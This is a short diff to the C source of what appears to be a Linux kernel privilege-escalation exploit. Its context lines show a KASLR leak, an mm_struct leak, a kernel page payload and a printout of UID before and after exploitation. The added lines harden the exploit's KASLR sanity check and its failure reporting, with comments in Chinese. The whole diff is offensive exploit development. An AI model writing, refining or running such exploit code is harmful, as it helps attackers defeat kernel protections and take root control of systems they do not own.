@@ -185,6 +185,13 @@ int run_exploit(int argc, char **argv) {
     goto exploit_summary;
   }
 
+  /* kaslr_base 廉价 sanity: slide 偏移整体漂移时提前 bail */
+  if ((kaslr_base & (PAGE_SIZE - 1)) ||
+      kaslr_base < KASLR_BASE_MIN || kaslr_base > KASLR_BASE_MAX) {
+    pr_warning("kaslr base sanity failed base=%016zx\n", (size_t)kaslr_base);
+    goto exploit_summary;
+  }
+
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) {
@@ -233,7 +240,10 @@ exploit_summary:
   printf("  UID:            %u -> %u\n", root_uid_before, root_uid_after);
   printf("========================================\n");
   if (!exploit_success) {
-    if (!kaslr_done)
+    if (g_offset_drift)
+      printf("  >> 偏移漂移: %s (cfi_step=%d) — 需重算该偏移\n",
+             g_offset_drift_item, cfi_last_step);
+    else if (!kaslr_done)
       printf("  >> 失败原因: KASLR 泄露失败\n");
     else if (!page_base)
       printf("  >> 失败原因: KernelSnitch mm_struct 泄露失败\n");
